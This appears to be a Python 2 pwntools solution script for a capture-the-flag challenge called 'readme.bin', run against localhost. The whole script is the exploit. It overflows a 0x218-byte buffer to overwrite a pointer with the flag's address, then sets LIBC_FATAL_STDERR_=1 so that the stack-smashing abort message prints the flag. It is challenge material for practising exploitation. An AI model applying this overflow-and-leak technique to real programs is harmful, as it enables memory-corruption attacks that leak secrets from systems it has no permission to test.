from pwn import *

addr_ow_flag = 0x600d20
addr_flag = 0x400d20

H,P = 'localhost', 6666

#r = process('./readme.bin')
r = remote(H,P)
junk  = r.recvuntil("What's your name? ")
exploit  = "A"*0x218
exploit += p64(addr_flag)
exploit += p64(0)
exploit += p64(addr_ow_flag)
r.sendline(exploit)
junk += r.recvuntil("Please overwrite the flag: ")
exploit  = "LIBC_FATAL_STDERR_=1"
r.sendline(exploit)
junk += r.recvall()
print junk
